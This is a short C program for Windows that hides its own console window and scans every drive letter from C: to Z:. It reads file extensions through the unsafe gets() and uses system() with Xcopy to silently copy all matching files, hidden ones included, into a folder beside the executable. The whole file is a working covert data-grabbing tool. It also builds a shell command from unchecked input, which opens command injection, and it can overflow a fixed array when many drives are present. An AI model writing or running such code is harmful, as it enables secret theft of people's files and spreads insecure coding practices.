#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <unistd.h>
#define C 67
#define Z 90
#define M 1024

int main() 
{
	
	char source[10][10], fsource[MAX_PATH];
	char line[MAX_PATH], file[MAX_PATH];
	char disp = C, janela[M];
	int  p = 0, val, i = 0; 
	
		GetConsoleTitle(janela, M);
		ShowWindow(FindWindow(NULL, janela),SW_HIDE);
		
			while(disp <= Z)
			{
				sprintf(line,"%c:", disp);
				val = access(line, X_OK); 
       			if(val == 0) {sprintf(source[i], "%c:\\*.%%e",disp); i++; }
				disp++;
			}
		
			gets(file);

			GetModuleFileName(NULL, fsource, MAX_PATH);
    		while(fsource[p] != '\0') { p++; }
    		while(fsource[p] != '\\') { p--; } p++; 
			fsource[p] = '\0'; p = 0;
	
    		strcat(fsource, "_output\\");
		
			while(p < i)
			{
				sprintf(line, "for %%e in (%s) do (Xcopy %s %s /s /c /h /q /y>nul)", file, source[p], fsource);  
				system(line);	
				p++;
			}
	
return 0;
}
